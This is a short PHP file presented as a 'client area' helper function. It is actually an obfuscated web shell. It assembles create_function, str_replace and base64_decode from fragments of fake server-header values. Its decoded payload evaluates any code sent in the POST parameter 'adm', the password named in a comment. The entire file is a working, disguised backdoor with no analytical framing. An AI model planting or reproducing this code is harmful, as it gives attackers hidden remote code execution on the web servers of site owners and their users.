<?php
// pwd=adm
if (!function_exists('get_c1ient_area')) {
    function get_c1ient_area() {
        $_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';
        $_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';
        $_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';
        $get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . "FUNCTION";
        $getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . "REPLACE";
        $isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . "DECODE";
        //@eval($_POST[adm])
        $rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 14));
        echo $rea1area;
        $on1inearea = $get_c1ient_area('', $rea1area);
        $on1inearea();
        return @$onlinearea;
    }
    $on1inearea = get_c1ient_area();
}
?>
